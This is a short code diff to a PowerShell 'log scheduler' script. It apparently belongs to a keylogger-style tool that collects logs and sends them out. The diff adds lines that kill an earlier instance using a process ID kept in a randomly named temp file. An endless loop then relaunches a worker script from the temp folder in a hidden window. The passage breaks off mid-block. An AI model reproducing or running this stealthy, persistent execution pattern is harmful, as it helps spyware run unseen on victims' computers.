@@ -1,10 +1,11 @@
 # powershell log scheduler
 # created by : C0SM0
 
-# times logs will be sent [keep in military time]
 for(;;) {
     try {
      # invoke the worker script
+     $proc = Get-Content "$env:temp/DdBPKCytRe"
+     Stop-process -id $proc -Force
      powershell Start-Process powershell.exe -windowstyle hidden "$env:temp/p.ps1"
     }
     catch {
